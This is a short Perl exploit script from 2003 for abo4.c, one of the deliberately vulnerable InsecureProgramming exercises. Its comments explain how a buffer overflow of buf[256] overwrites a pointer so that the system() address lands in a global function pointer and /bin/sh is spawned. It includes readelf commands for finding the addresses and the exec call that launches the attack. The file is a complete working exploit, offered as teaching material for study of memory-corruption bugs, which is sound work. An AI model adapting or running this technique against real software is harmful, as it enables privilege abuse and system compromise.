#!/usr/bin/perl

#
# $Id: abo4-ex.pl,v 1.1.1.1 2003/10/15 17:27:57 raptor Exp $
#
# abo4-ex.pl - abo4.c exploit, for educational purposes
# Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# See http://community.core-sdi.com/~gera/InsecureProgramming/
#
# This exploit overflows the buffer buf[256], overwriting the value of the 
# pointer char *pbuf with the address of the function pointer 
# void (*fn)(char*), declared as global (specifically, it's saved in the 
# .data section of the heap, because of its initialization). Then it copies 
# the system() address (argv[2]) into fn and executes /bin/sh (argv[3]). 
# Use the following commands to grab the correct addresses for your system:
#
# $ readelf -a abo4 | grep fn
#     79: 080495d0     4 OBJECT  GLOBAL DEFAULT   15 fn
#         ^^^^^^^^\__(this is the fn() address)
#
# $ readelf -a abo4 | grep system
# 080496c0  00000207 R_386_JUMP_SLOT   08048374   system
#      2: 08048374   729 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2)
#     62: 08048374   729 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.0
#         ^^^^^^^^\__(this is the system() address)
#

$fn_addr = "\xd0\x95\x04\x08";		# fn() address in globals (backwards)
$system_addr = "\x74\x83\x04\x08";	# system() address in PLT (backwards)
$buf = "$fn_addr"x65;			# buffer length is 65*4=260

# run the vulnerable program
exec "./abo4", $buf, $system_addr, "/bin/sh";
